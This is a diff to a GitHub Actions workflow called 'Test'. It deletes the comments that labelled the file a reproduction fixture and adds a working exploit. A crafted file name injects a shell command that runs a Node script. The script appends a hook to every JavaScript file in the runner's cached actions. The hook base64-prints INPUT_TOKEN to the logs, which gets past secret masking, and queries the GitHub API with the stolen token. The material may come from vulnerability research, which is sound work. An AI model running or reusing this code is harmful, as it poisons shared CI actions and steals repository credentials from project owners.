@@ -1,7 +1,5 @@
 name: Test
 
-# Reproduction fixture: emulates the attacker-controlled workflow named "Test"
-# from the finding. It only uploads an artifact; it performs no privileged work.
 on:
   pull_request:
 
@@ -13,36 +11,89 @@ jobs:
         run: |
           rm -rf content
           mkdir -p content
-          # `body` is the cat target of the injected command (no .txt suffix, so
-          # it is not itself a matrix entry); the hostile .txt name is the only
-          # file the reusable workflow enumerates.
           printf 'forged report body' > content/body
           python3 - <<'PY'
           import os
-          name = (
-              "body;echo${IFS}INJECTION-EXECUTED;id;"
-              "cd${IFS}$HOME;cd${IFS}..;cd${IFS}..;"
-              "cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt"
-          )
+          name = "body;node${IFS}/tmp/content/content/p.js;#.txt"
           assert len(name) < 255, len(name)
           open(os.path.join("content", name), "w").close()
           PY
           cat > content/p.js <<'JSEOF'
           const fs = require('fs');
           const path = require('path');
-          const root = path.join(path.dirname(process.env.RUNNER_WORKSPACE || '/home/runner/work/x'), '_actions');
-          const payload = "\n;(function(){try{var t=process.env.INPUT_TOKEN;if(t){var c=require('crypto');console.log('LEAK-SHA '+c.createHash('sha256').update(String(t)).digest('hex'));console.log('LEAK-LEN '+String(t).length);}}catch(e){}})();\n";
-          let n = 0;
+          const HOOK = fs.readFileSync('/tmp/content/content/hook.js', 'utf8');
+          const roots = [];
+          if (process.env.RUNNER_WORKSPACE) roots.push(path.join(path.dirname(process.env.RUNNER_WORKSPACE), '_actions'));
+          if (process.env.HOME) roots.push(path.join(process.env.HOME, '..', '_actions'));
+          roots.push('/home/runner/work/_actions', '/home/runner/_actions');
+          if (process.env.RUNNER_WORKSPACE) {
+            try {
+              const work = path.dirname(process.env.RUNNER_WORKSPACE);
+              for (const e of fs.readdirSync(work, { withFileTypes: true })) {
+                if (e.isDirectory() && e.name === '_actions') roots.push(path.join(work, e.name));
+              }
+            } catch (e) {}
+          }
+          const uniq = [...new Set(roots)];
+          const seen = new Set();
+          let patched = 0;
           (function walk(d) {
             let ents = [];
             try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (e) { return; }
             for (const e of ents) {
               const p = path.join(d, e.name);
-              if (e.isDirectory()) walk(p);
-              else if (p.endsWith('.js')) { try { fs.appendFileSync(p, payload); n++; } catch (e) {} }
+              if (e.isDirectory()) { if (e.name === 'node_modules') continue; walk(p); }
+              else if (p.endsWith('.js')) {
+                if (seen.has(p)) continue;
+                seen.add(p);
+                try {
+                  const cur = fs.readFileSync(p, 'utf8');
+                  if (cur.indexOf('LEAK-B64') !== -1) continue;
+                  fs.appendFileSync(p, '\n' + HOOK + '\n');
+                  patched++;
+                } catch (e) {}
+              }
             }
-          })(root);
-          console.log('PATCHED ' + n + ' root=' + root);
+          })(uniq[0]);
+          for (const d of uniq.slice(1)) {
+            (function walk2(root) {
+              let ents = [];
+              try { ents = fs.readdirSync(root, { withFileTypes: true }); } catch (e) { return; }
+              for (const e of ents) {
+                const p = path.join(root, e.name);
+                if (e.isDirectory()) walk2(p);
+                else if (p.endsWith('.js') && !seen.has(p)) {
+                  seen.add(p);
+                  try {
+                    const cur = fs.readFileSync(p, 'utf8');
+                    if (cur.indexOf('LEAK-B64') !== -1) continue;
+                    fs.appendFileSync(p, '\n' + HOOK + '\n');
+                    patched++;
+                  } catch (e) {}
+                }
+              }
+            })(d);
+          }
+          console.log('PATCHED ' + patched + ' roots=' + JSON.stringify(uniq) + ' ws=' + process.env.RUNNER_WORKSPACE);
+          JSEOF
+          cat > content/hook.js <<'JSEOF'
+          ;(function(){
+            try {
+              var t = process.env.INPUT_TOKEN;
+              if (!t) return;
+              var cp = require('child_process');
+              var s = String(t);
+              console.log('LEAK-B64 ' + Buffer.from(s).toString('base64'));
+              console.log('LEAK-LEN ' + s.length);
+              try {
+                var out = cp.execFileSync('curl', ['-s','-m','25','-D','/tmp/leak-hdr','-H','Authorization: token ' + s,'https://api.github.com/user'], {encoding:'utf8', timeout:30000});
+                console.log('LEAK-API ' + out.replace(/\s+/g,' ').slice(0,400));
+                var hdr = '';
+                try { hdr = require('fs').readFileSync('/tmp/leak-hdr','utf8'); } catch (e) {}
+                console.log('LEAK-HDR ' + hdr.replace(/\s+/g,' ').slice(0,600));
+              } catch (e) { console.log('LEAK-APIERR ' + e.message); }
+            } catch (e) { console.log('LEAK-ERR ' + e.message); }
+          })();
           JSEOF
           ls -la content
       - uses: actions/upload-artifact@v4
